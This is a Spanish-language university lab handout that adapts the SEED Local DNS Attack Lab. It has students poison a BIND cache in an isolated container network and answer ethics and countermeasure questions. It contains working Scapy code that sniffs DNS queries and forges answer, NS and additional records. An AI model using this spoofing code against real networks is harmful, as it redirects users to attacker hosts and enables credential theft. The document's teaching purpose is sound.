# P-11 · Ataques al DNS Local

> Práctica del **Manual de Prácticas** de Seguridad en Redes · INGE-00107 · Universidad de Cuenca.  
> Documento generado desde el manual: no lo edite a mano (véase [`practicas/README.md`](README.md)).

| Campo | Valor |
| --- | --- |
| **Asignatura** | Seguridad en Redes |
| **Docente** | Dr. Fabián Astudillo-Salinas |
| **Unidad** | 800 – Sistema DNS y ataques |
| **Código** | INGE-00107 |
| **Modalidad** | Presencial |
| **Valoración** | 10 puntos |
| **Grupos** | Máx. 3 estudiantes |
| **Entrega** | Según calendario |
| **ABET** | SO4 – Responsabilidad Ética y Profesional (PI 4.1 y PI 4.2) — representa el 30 % de la valoración |

## Marco Teórico

Los fundamentos teóricos sintetizados en esta sección se basan en [1], [2]; se recomienda consultar dichas fuentes para una exposición más profunda. El procedimiento de laboratorio adapta el *Local DNS Attack Lab* de SEED [2].

### DNS y cómo funciona

El **DNS** (Domain Name System) es la «guía telefónica» de Internet: traduce nombres de host a direcciones IP (y viceversa) mediante el proceso de *resolución*, que ocurre de forma transparente para el usuario. Cuando un usuario escribe un nombre (p. ej. `www.example.com`), su equipo envía una consulta a su **servidor DNS local**, que realiza la resolución recursiva consultando a los servidores autoritativos y devuelve el resultado, almacenándolo en su **caché**.

### Ataques al DNS local

Los **ataques al DNS** manipulan la resolución para redirigir a los usuarios hacia destinos alternativos, normalmente maliciosos (p. ej. un sitio falso de banca en línea para robar credenciales). Atacar a una víctima local es mucho más fácil que atacar un servidor DNS remoto, porque el atacante está en la misma LAN y puede **husmear** (sniff) las consultas y **falsificar** (spoof) las respuestas. Esta práctica se centra en los ataques locales y cubre:

- DNS y configuración de un servidor DNS local (BIND 9).
- Ataque de **envenenamiento de caché** (DNS cache poisoning).
- Falsificación de respuestas DNS (secciones *Answer*, *Authority* y *Additional*).
- Husmeo y falsificación de paquetes con la herramienta **Scapy**.

> [!NOTE]
> El envenenamiento de caché DNS es ilegal contra servidores reales; por eso se monta un servidor DNS propio en un entorno aislado. DNSSEC, que previene estos ataques, se estudia y configura en la práctica P-15.

**Objetivo general**
Comprender cómo funcionan los ataques al DNS local montando un servidor DNS propio y ejecutando, de forma controlada, ataques de falsificación y envenenamiento de caché contra la víctima y el resolvedor.
**Objetivos específicos**

- **OE1.** Levantar la topología de contenedores y verificar la configuración del DNS local y del servidor de nombres del atacante.
- **OE2.** Falsificar directamente la respuesta DNS enviada al usuario (husmeo y *spoofing* con Scapy).
- **OE3.** Envenenar la caché del servidor DNS local falsificando la sección *Answer*.
- **OE4.** Falsificar registros NS (sección *Authority*) para afectar a todo el dominio y a otros dominios.
- **OE5.** Falsificar registros de la sección *Additional* y analizar qué entradas son aceptadas o rechazadas por la caché.

## Actividades previas

Antes de la sesión de laboratorio, cada estudiante debe completar las siguientes actividades preparatorias:

- **AP1.** Leer el marco teórico de esta práctica y las referencias citadas para resolver dudas conceptuales antes de ingresar al laboratorio.
- **AP2.** Verificar que el entorno virtual (VMs SEED/Kali y red NAT) esté operativo conforme al capítulo *Configuración del Entorno: SEED VM en VirtualBox*.
- **AP3.** Tomar una *snapshot* del estado inicial de cada VM involucrada en la práctica para poder revertir cambios.
- **AP4.** Revisar la Sección [Seguridad y normas generales del laboratorio](00-normas-generales.md#seguridad-y-normas-generales-del-laboratorio) (Seguridad y normas generales del laboratorio).
- **AP5.** Preparar la bitácora digital (plantilla provista o documento propio) para registrar comandos, capturas y observaciones durante la sesión.

## Materiales y Equipos

| Recurso | Descripción |
| --- | --- |
| SEED Ubuntu 20.04 VM | Entorno de laboratorio SEED |
| SEED `Labsetup.zip` | Topología y `docker-compose.yml` del Local DNS Lab |
| Docker + Docker Compose | Contenedores: usuario, DNS local, atacante y NS del atacante |
| Python 3 + Scapy | Husmeo y construcción de paquetes DNS falsos |
| BIND 9 (`named`, `rndc`, `dig`) | Servidor DNS local y consultas |

> [!NOTE]
> **Provisión de materiales**
>
> El estudiante adquiere o instala por su cuenta el equipo personal (laptop), las máquinas virtuales (VirtualBox, SEED VM, Kali Linux, contenedores Docker) y todo el software listado arriba. El laboratorio de la Carrera de Telecomunicaciones provee el espacio físico, el mobiliario y **acceso a Internet supervisado** para la descarga de imágenes, paquetes y consulta de documentación durante la sesión. El laboratorio no entrega equipos de cómputo personales ni licencias de software.

## Entorno de Laboratorio

> **Figura 1.** Topología del laboratorio P-11 (*Lab environment setup*): usuario, DNS local, atacante y servidor de nombres del atacante en la LAN 10.9.0.0/24, con salida a Internet por el router.  
> *(diagrama vectorial; se reproduce en el PDF del manual)*

El entorno usa cuatro máquinas en la misma LAN: el **usuario** (víctima), el **servidor DNS local**, y el **atacante** junto con su **servidor de nombres** (que aloja la zona `attacker32.com` y una zona falsa de `example.com`). El usuario está configurado para usar `10.9.0.53` como su DNS local (vía `/etc/resolv.conf`).

## Consideraciones de seguridad

Antes de iniciar el procedimiento, revise la Sección [Seguridad y normas generales del laboratorio](00-normas-generales.md#seguridad-y-normas-generales-del-laboratorio) (Seguridad y normas generales del laboratorio). Para esta práctica se destacan los siguientes riesgos y precauciones específicas:

- **Aislamiento de red obligatorio**: las herramientas ofensivas y los tráficos manipulados deben permanecer dentro de las VMs y la red NAT del laboratorio. Está prohibido ejecutar comandos de esta práctica contra la red institucional, redes públicas o equipos de terceros.
- **Snapshots y reversibilidad**: tome una instantánea antes de ejecutar comandos potencialmente destructivos (modificación de `iptables`, tablas ARP/ruteo, `/etc/hosts`, `rc.local`, claves, certificados, etc.).
- **Marco legal**: el uso de las herramientas fuera del entorno autorizado puede tipificarse como delito informático (COIP Arts. 229 y 234; Ley Orgánica de Protección de Datos Personales). Véase el warningbox de la Sección [Seguridad y normas generales del laboratorio](00-normas-generales.md#seguridad-y-normas-generales-del-laboratorio).
- **Riesgos eléctricos y ergonomía**: aplique las pausas activas y las verificaciones eléctricas de las Secciones *Riesgos eléctricos* y *Ergonomía* dentro de Sección [Seguridad y normas generales del laboratorio](00-normas-generales.md#seguridad-y-normas-generales-del-laboratorio) (Art. 37 y Art. 38 del Reglamento UC-CU-REG-006-2024).

> [!WARNING]
> **Riesgos específicos de la práctica**
>
> Antes de avanzar, el estudiante debe identificar y discutir con el docente cualquier riesgo adicional propio de esta práctica (por ejemplo: pérdida de conectividad de la VM atacante, denegación de servicio inducida sobre el host, generación accidental de tráfico ruidoso que sature la red NAT). Documente estos riesgos y las medidas de mitigación en la bitácora.

## Procedimiento

### Configuración del entorno y comandos

Descargue `Labsetup.zip`, descomprímalo y use `docker-compose.yml` para levantar la topología. La SEED VM incluye alias para Docker Compose y para abrir una *shell* en un contenedor.

**Listado 1.** Levantar la topología y abrir una shell

```bash
$ dcbuild        # docker-compose build
$ dcup           # docker-compose up
$ dockps         # docker ps --format "{{.ID}} {{.Names}}"
$ docksh <id>    # docker exec -it <id> /bin/bash
```

> [!NOTE]
> **Contenedor atacante**
>
> El contenedor atacante usa `network_mode: host` para poder husmear el tráfico de los demás contenedores (un contenedor normal solo ve su propio tráfico), y una carpeta compartida `./volumes` para editar el código en la VM y ejecutarlo dentro del contenedor.

### Resumen de la configuración DNS

Los contenedores ya vienen configurados; conviene conocer los puntos clave:

- **Servidor DNS local**: ejecuta BIND 9 (`/etc/bind/named.conf` y `named.conf.options`). Por simplicidad se **fija el puerto origen** a `33333` y se **desactiva DNSSEC**.
- **Zona reenviada**: `attacker32.com` se reenvía al servidor de nombres del atacante (`10.9.0.153`).

  **Listado 2.** Zona forward en named.conf

  ```
  zone "attacker32.com" {
      type forward;
      forwarders { 10.9.0.153; };
  };
  ```
- **Servidor de nombres del atacante**: aloja su zona legítima `attacker32.com` y una zona **falsa** de `example.com`.
- **Caché del DNS local**: se inspecciona y limpia con `rndc`.

  **Listado 3.** Gestión de la caché DNS

  ```bash
  # rndc dumpdb -cache   # vuelca la caché a /var/cache/bind/dump.db
  # rndc flush           # limpia la caché DNS
  ```

### Pruebas de la configuración (desde el usuario)

**Listado 4.** Verificar la configuración DNS

```bash
# El DNS local reenvía a ns.attacker32.com (zona attacker32.com)
$ dig ns.attacker32.com
# Consultar example.com: por el DNS local vs. directo al NS del atacante
$ dig www.example.com
$ dig @ns.attacker32.com www.example.com
```

Nadie consulta a `ns.attacker32.com` por `www.example.com`: siempre se pregunta al servidor oficial de `example.com`. El objetivo del envenenamiento de caché es lograr que las víctimas pidan a `ns.attacker32.com` la IP de `www.example.com`.

### Tarea 1 — Falsificar la respuesta directamente al usuario

Cuando el usuario consulta un sitio, su equipo envía una consulta DNS al DNS local. El atacante husmea esa consulta, crea inmediatamente una respuesta falsa y la envía al usuario; si la respuesta falsa llega *antes* que la real, será aceptada (Figura 2).

> **Figura 2.** Ataque de envenenamiento de DNS local: el atacante husmea las consultas y responde con datos falsos, al usuario (Tarea 1) o al servidor DNS local (Tareas 2–5). Adaptado de la Fig. 2 del SEED Local DNS Lab.  
> *(diagrama vectorial; se reproduce en el PDF del manual)*

**Listado 5.** Esqueleto del ataque de *spoofing* (Scapy)

```python
#!/usr/bin/env python3
from scapy.all import *

NS_NAME = "example.com"

def spoof_dns(pkt):
  if (DNS in pkt and NS_NAME in pkt[DNS].qd.qname.decode('utf-8')):
    print(pkt.sprintf("{DNS: 
    ip  = IP(...)             # crear objeto IP
    udp = UDP(...)            # crear objeto UDP
    Anssec = DNSRR(...)       # crear el registro de respuesta
    dns = DNS(...)            # crear objeto DNS
    spoofpkt = ip/udp/dns     # ensamblar el paquete falso
    send(spoofpkt)

myFilter = "..."             # definir el filtro
pkt = sniff(iface='br-43d947d991eb', filter=myFilter, prn=spoof_dns)
```

> [!NOTE]
> **Interfaz y caché**
>
> Sustituya el valor de `iface` por el nombre real de la interfaz (`br-...`) de la red `10.9.0.0/24`. Antes de atacar, limpie la caché del DNS local (`rndc flush`); si la caché ya tiene la respuesta, la del servidor llegará antes que la falsificada y el ataque no tendrá éxito.

### Tarea 2 — Envenenamiento de caché (sección *Answer*)

Atacar solo a la víctima exige falsificar cada consulta. Es más efectivo atacar al **servidor DNS local**: si se falsifica la respuesta de los servidores autoritativos, el DNS local la guardará en su caché y la servirá a todos sus clientes hasta que expire (basta envenenar una vez). Modifique el programa de la Tarea 1 para este ataque; limpie la caché con `rndc flush` antes de atacar y verifique el resultado:

**Listado 6.** Inspeccionar la caché envenenada

```bash
# rndc dumpdb -cache
# cat /var/cache/bind/dump.db
```

### Tarea 3 — Falsificar registros NS (sección *Authority*)

El ataque anterior afecta a un solo nombre de host. Para afectar a todo el dominio `example.com`, se añade en la sección *Authority* un registro NS que designe a `ns.attacker32.com` (controlado por el atacante, `10.9.0.153`) como servidor de nombres del dominio:

**Listado 7.** Registro NS falsificado (Authority)

```
;; AUTHORITY SECTION:
example.com.   259200  IN  NS  ns.attacker32.com.
```

Tras el ataque, una consulta a cualquier host de `example.com` devolverá la IP falsa provista por `ns.attacker32.com`. Verifique si el registro NS quedó en la caché.

### Tarea 4 — Falsificar NS para otro dominio

Inspirado en lo anterior, se intenta extender el impacto a otro dominio: en la respuesta falsa a una consulta de `www.example.com` se añade una entrada *Authority* que designe a `ns.attacker32.com` como NS de `google.com`:

**Listado 8.** Intento de NS falso para otro dominio

```
;; AUTHORITY SECTION:
example.com.   259200  IN  NS  ns.attacker32.com.
google.com.    259200  IN  NS  ns.attacker32.com.
```

Tras el ataque, revise la caché y explique qué registro **sí** se almacena y cuál **no** (la consulta atacada sigue siendo a `example.com`, no a `google.com`).

### Tarea 5 — Falsificar la sección *Additional*

La sección *Additional* aporta información extra (típicamente IPs de los hosts citados en *Authority*). Al responder a `www.example.com` se añaden entradas adicionales y se observa cuáles acepta la caché:

**Listado 9.** Registros en la sección Additional

```
;; AUTHORITY SECTION:
example.com.        259200  IN  NS  ns.example.com.
;; ADDITIONAL SECTION:
ns.attacker32.com.  259200  IN  A   1.2.3.4   (1)
ns.example.net.     259200  IN  A   5.6.7.8   (2)
www.facebook.com.   259200  IN  A   3.4.5.6   (3)
```

Las entradas (1) y (2) se relacionan con hosts de la sección *Authority*; la (3) es irrelevante para la respuesta. Reporte qué entradas se almacenan en la caché y cuáles no, y explique por qué.

### Guía: construir paquetes DNS con Scapy

El código de muestra (`dns_sniff_spoof.py`) husmea una consulta y falsifica una respuesta con un registro en *Answer*, dos en *Authority* y dos en *Additional*:

**Listado 10.** Construir un paquete DNS completo (dns_sniff_spoof.py)

```python
def spoof_dns(pkt):
  if (DNS in pkt and 'www.example.net' in pkt[DNS].qd.qname.decode('utf-8')):
    # Intercambiar IP y puerto origen/destino
    IPpkt  = IP(dst=pkt[IP].src, src=pkt[IP].dst)
    UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)
    # Sección Answer
    Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',
                   ttl=259200, rdata='10.0.2.5')
    # Sección Authority
    NSsec1 = DNSRR(rrname='example.net', type='NS',
                   ttl=259200, rdata='ns1.example.net')
    NSsec2 = DNSRR(rrname='example.net', type='NS',
                   ttl=259200, rdata='ns2.example.net')
    # Sección Additional
    Addsec1 = DNSRR(rrname='ns1.example.net', type='A',
                    ttl=259200, rdata='1.2.3.4')
    Addsec2 = DNSRR(rrname='ns2.example.net', type='A',
                    ttl=259200, rdata='5.6.7.8')
    # Construir el payload DNS
    DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,
                 qdcount=1, ancount=1, nscount=2, arcount=2,
                 an=Anssec, ns=NSsec1/NSsec2, ar=Addsec1/Addsec2)
    spoofpkt = IPpkt/UDPpkt/DNSpkt
    send(spoofpkt)

f = 'udp and dst port 53'
pkt = sniff(iface='br-43d947d991eb', filter=f, prn=spoof_dns)
```

Campos clave del payload DNS: `id` (Transaction ID, igual al de la consulta), `qd` (dominio consultado), `aa` (respuesta autoritativa), `rd` (recursión deseada), `qr` (1 = respuesta), `qdcount/ancount/nscount/arcount` (número de registros en cada sección) y `an/ns/ar` (secciones *Answer*, *Authority* y *Additional*).

> [!WARNING]
> **Posible problema de rendimiento**
>
> Dentro de contenedores, a veces el husmeo/falsificación es lento y la respuesta falsa llega tarde. Como solución, añada retardo al tráfico saliente del router con `tc` sobre la interfaz externa (`eth0`, red `10.8.0.0/24`): `tc qdisc add dev eth0 root netem delay 100ms`.

## Recolección y análisis de datos

Durante la ejecución del procedimiento, registre en su bitácora los datos solicitados a continuación. Las tablas siguientes (o equivalentes en su informe) forman parte del entregable, conforme a la Sección [Directrices generales para el informe técnico](00-normas-generales.md#directrices-generales-para-el-informe-técnico) (Directrices generales para el informe técnico).

**Tabla 1.** Bitácora de comandos y observaciones

| # | Comando / Acción | Salida u observación relevante |
| --- | --- | --- |
| 1 |   |   |
| 2 |   |   |
| 3 |   |   |
| 4 |   |   |
| 5 |   |   |

**Tabla 2.** Resultados clave / métricas obtenidas

| Métrica o evidencia | Valor | Comentario / unidad |
| --- | --- | --- |
|   |   |   |
|   |   |   |
|   |   |   |

**Pautas para el análisis de los datos recolectados:**

- Contraste los resultados observados con el comportamiento esperado según el marco teórico; explique las diferencias.
- Identifique anomalías o resultados inesperados y proponga una hipótesis explicativa basada en la teoría de la práctica.
- Cuando aplique, calcule métricas cuantitativas (latencias, tasas de éxito del ataque, paquetes inyectados, cobertura del escaneo, número de credenciales descubiertas, etc.) y preséntelas en gráficos o tablas adicionales en el informe.

## Preguntas de Análisis

- **P1.** ¿Por qué es más fácil envenenar un servidor DNS local que uno remoto? ¿Qué ventaja le da al atacante estar en la misma LAN?
- **P2.** Explique el papel del campo *Transaction ID* (`id`) y por qué la respuesta falsa debe copiarlo de la consulta. ¿Qué papel juega además el puerto origen (fijado a `33333` en el lab)?
- **P3.** Compare la Tarea 1 (falsificar al usuario) con la Tarea 2 (envenenar la caché del DNS local): ¿por qué la segunda es más eficiente y duradera?
- **P4.** En las Tareas 3–5, ¿por qué un registro NS en la sección *Authority* afecta a todo el dominio, mientras que un registro de la sección *Additional* para un dominio no relacionado (p. ej. `www.facebook.com`) *no* se almacena en la caché? Relaciónelo con la verificación de *bailiwick*.
- **P5.** ¿Por qué fue necesario limpiar la caché (`rndc flush`) antes de cada ataque? ¿Qué ocurre si la respuesta legítima llega primero?
- **P6.** ¿Cómo previene DNSSEC el envenenamiento de caché estudiado aquí? (se configura en la práctica P-15).
- **P7.** Mencione tres consecuencias reales de un ataque de DNS spoofing exitoso contra una organización.

## Actividad ABET — SO4: Responsabilidad Ética y Profesional

Esta actividad mide el **Student Outcome 4 (SO4)** de la Carrera de Telecomunicaciones requerido para la acreditación ABET: *habilidad para reconocer las responsabilidades éticas y profesionales en situaciones de ingeniería y emitir juicios fundamentados, considerando el impacto global, económico, medioambiental y social de las soluciones propuestas.* Representa el **30 %** de la valoración total de la práctica y evalúa los indicadores PI 4.1 y PI 4.2 mediante las preguntas SO4-1 y SO4-2.

- **SO4-1.** **[PI 4.1 — 15 %] Ética y responsabilidad profesional ante un incidente de envenenamiento DNS**
  Un ingeniero de telecomunicaciones de una empresa ecuatoriana detecta que el servidor DNS interno está sufriendo el ataque de envenenamiento de caché estudiado en esta práctica. Redacte una respuesta ética y profesional que incluya:

  - **a)** Las **acciones inmediatas de contención** que debe ejecutar para limitar el impacto del ataque, justificadas desde la perspectiva del deber profesional del ingeniero.
  - **b)** La **cadena de notificación** interna y externa: a quién informar, en qué orden y con qué nivel de detalle. Fundamente cada decisión en principios éticos de la ingeniería (confidencialidad vs. transparencia, proporcionalidad, no maleficencia).
  - **c)** El **marco legal ecuatoriano** aplicable: analice cómo los Arts. 229 y 234 del COIP y la Ley Orgánica de Protección de Datos Personales (LOPDP) afectan las responsabilidades del atacante y del ingeniero que omita o retrase el reporte del incidente.
- **SO4-2.** **[PI 4.2 — 15 %] Impacto económico, social y ambiental de un ataque de envenenamiento DNS a escala**
  Una institución financiera ecuatoriana con 500 000 usuarios activos sufre un ataque de envenenamiento de caché DNS que permanece activo durante 6 horas. Analice de manera integral las siguientes dimensiones:

  - **a)** **Económico:** estime cualitativamente las pérdidas directas (interrupción de transacciones, costos de respuesta al incidente, posibles multas regulatorias) e indirectas (pérdida de reputación, fuga de clientes).
  - **b)** **Social:** examine las consecuencias para los usuarios finales (riesgo de robo de credenciales, fraude financiero, erosión de la confianza en servicios digitales) y para la sociedad en general (brecha digital, desigualdad en acceso a servicios seguros).
  - **c)** **Ambiental:** evalúe el consumo energético adicional asociado a la respuesta al incidente (análisis forense, reconfiguración de servidores, respaldo de datos) y su huella de carbono aproximada.
  - **d)** **Contramedidas:** proponga **dos contramedidas técnicas** (p. ej., DNSSEC, DNS-over-TLS/HTTPS) y **una política organizacional** que reduzcan los impactos anteriores, citando al menos un estándar internacional (*RFC 4033*, *NIST SP 800-81r2* o *ISO/IEC 27001*).

## Discusión y conclusiones

A partir de los datos recolectados y del análisis realizado, elabore una discusión que responda al menos a las siguientes preguntas guía:

- **DC1.** ¿Se alcanzaron los objetivos planteados? Justifique cada uno con evidencia experimental concreta (capturas, métricas, salidas de comandos).
- **DC2.** ¿Qué limitaciones impone el entorno virtualizado a los resultados? ¿Cómo se trasladarían las observaciones a un escenario real de producción?
- **DC3.** ¿Qué contramedidas o controles de seguridad mitigan el ataque o refuerzan la defensa estudiada? Cite al menos una buena práctica de la industria, una RFC o un estándar (ISO/IEC, IEEE, NIST) pertinente.
- **DC4.** ¿Qué errores se cometieron durante la práctica y qué recomendaciones daría a futuros estudiantes para evitarlos?

Cierre con **conclusiones** (3–5 viñetas) que resuman los hallazgos principales y los vinculen explícitamente con los *Resultados de Aprendizaje* de la asignatura.

## Entregables

1. **Informe técnico** detallado con capturas que describan lo realizado y observado en cada tarea (1–5): código Scapy comentado, salidas de `dig`, volcado de la caché (`rndc dumpdb`) antes/después del ataque y qué registros se almacenan o se rechazan en cada sección. Explique cada fragmento de código (adjuntar sin explicar no recibe puntaje). Bibliografía IEEE (≥3 fuentes).
2. **Respuestas a la Actividad ABET – SO4** (preguntas SO4-1 y SO4-2), integradas en el informe técnico con extensión de 1–2 páginas por pregunta y las fuentes citadas según norma IEEE.

## Rúbrica de Evaluación

1.4

**Tabla 3.** Rúbrica — P-11 (10 puntos)

| Criterio | Peso | Indicador | Descripción |
| --- | --- | --- | --- |
| Entorno y pruebas | 10 % | Topología verificada | Contenedores operativos; `dig` confirma la configuración del DNS local y del NS atacante. |
| Spoofing al usuario | 20 % | Respuesta falsa aceptada | Tarea 1: respuesta falsificada llega antes y el usuario obtiene la IP del atacante (visible en Wireshark). |
| Envenenamiento de caché | 25 % | Caché del DNS local | Tareas 2–3: entrada falsa (*Answer* y NS en *Authority*) almacenada en la caché y verificada con `rndc dumpdb`. |
| Authority/Additional | 5 % | Análisis de aceptación | Tareas 4–5: explica qué registros se aceptan o rechazan y por qué. |
| Análisis técnico | 10 % | Preguntas respondidas | Respuestas con fundamento técnico. |
| **ABET – SO4: Responsabilidad Ética y Profesional (30 %)** |   |   |   |
| PI 4.1 – Ética profesional | 15 % | Respuesta ética fundamentada | Aplica principios éticos y legales (COIP, LOPDP) al escenario de incidente DNS; la cadena de notificación está justificada. |
| PI 4.2 – Impacto integral | 15 % | Análisis de impacto | Evalúa impacto económico, social y ambiental con contramedidas técnicas y organizacionales, citando al menos un estándar internacional. |

1.25

**Tabla 4.** Escala ABET SO4 — P-11

| PI | No cumple<br>(0–59 %) | Cumple parcialmente<br>(60–69 %) | Cumple<br>(70–79 %) | Supera<br>(80–89 %) | Supera ampliamente<br>(90–100 %) |
| --- | --- | --- | --- | --- | --- |
| 4.1 | No aplica principios éticos ni profesionales al evaluar la situación de incidente. | Aplica de manera inconsistente los principios éticos; el análisis legal es superficial o erróneo. | Aplica de manera básica los principios éticos; menciona el marco legal ecuatoriano sin análisis profundo. | Aplica coherentemente su juicio ético y profesional; integra el COIP y la LOPDP con argumentación clara. | Aplica de manera ejemplar e integral su juicio ético; argumenta cada decisión con evidencia y normativas citadas con precisión. |
| 4.2 | No considera ninguno de los tres impactos (económico, social, ambiental). | Considera parcialmente uno o dos de los impactos; las contramedidas no citan estándares. | Considera los tres impactos de forma adecuada; propone contramedidas pertinentes con al menos un estándar citado. | Integra los tres impactos con análisis detallado y contramedidas bien fundamentadas en estándares internacionales. | Realiza una evaluación exhaustiva de los tres impactos; las contramedidas son innovadoras y se respaldan en múltiples estándares. |

## Referencias

1. Arends, Roy and others, «DNS Security Introduction and Requirements». RFC 4033, 2005.
2. Du, Wenliang, «Computer & Internet Security: A Hands-on Approach». Independently published, 2019.
